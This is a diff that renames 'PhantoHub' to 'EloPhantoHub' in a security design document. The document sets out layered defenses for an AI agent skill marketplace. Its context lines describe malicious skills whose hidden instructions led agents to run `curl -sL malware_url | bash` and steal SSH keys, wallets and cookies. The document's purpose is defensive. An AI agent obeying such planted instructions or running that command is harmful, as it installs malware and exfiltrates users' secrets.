@@ -14,7 +14,7 @@ Skill marketplaces are an emerging attack surface. As AI agent ecosystems grow, 
 
 This is not theoretical — malicious skills have already been found in agent marketplaces disguised as crypto trading bots, productivity tools, and browser automation helpers. The documentation looked professional, but hidden instructions tricked agents into running `curl -sL malware_url | bash`, stealing SSH keys, crypto wallets, and browser cookies.
 
-EloPhanto's PhantoHub is a skill marketplace. We are a target for the same class of attack. This document specifies the defenses.
+EloPhanto's EloPhantoHub is a skill marketplace. We are a target for the same class of attack. This document specifies the defenses.
 
 ## Threat Model
 
@@ -88,7 +88,7 @@ Seven layers, from publisher to runtime:
 
 ### Requirements to Publish
 
-| Requirement | Typical marketplace | PhantoHub |
+| Requirement | Typical marketplace | EloPhantoHub |
 |-------------|---------------------|-----------|
 | GitHub account age | Days to weeks | **90 days minimum** |
 | Identity verification | None or minimal | **GitHub profile with real activity** |
@@ -391,7 +391,7 @@ When a hub skill is loaded for the first time, the agent notifies the user:
 
 ```
 Loading skill "gmail-automation" (v1.0.5) by @author-name [Verified]
-This skill was downloaded from PhantoHub. It has passed automated security scanning.
+This skill was downloaded from EloPhantoHub. It has passed automated security scanning.
 ```
 
 If the skill triggered any warning patterns during load:
@@ -477,6 +477,6 @@ P0 items can be implemented immediately with no infrastructure changes — they'
 
 ## Summary
 
-Skill marketplaces are a high-risk attack surface in the AI agent space. This is an evolving problem — as agents become more capable, the incentive to poison skill registries grows. PhantoHub's defense-in-depth approach layers publisher verification, automated scanning, human review, integrity checks, runtime content policies, permission enforcement, and incident response to minimize risk at every stage of the skill lifecycle.
+Skill marketplaces are a high-risk attack surface in the AI agent space. This is an evolving problem — as agents become more capable, the incentive to poison skill registries grows. EloPhantoHub's defense-in-depth approach layers publisher verification, automated scanning, human review, integrity checks, runtime content policies, permission enforcement, and incident response to minimize risk at every stage of the skill lifecycle.
 
 No single layer is sufficient. The combination of all seven ensures that an attacker would need to bypass publisher verification, automated scanning, human review, checksum verification, content policy enforcement, AND the runtime permission system to cause harm. That's the goal.
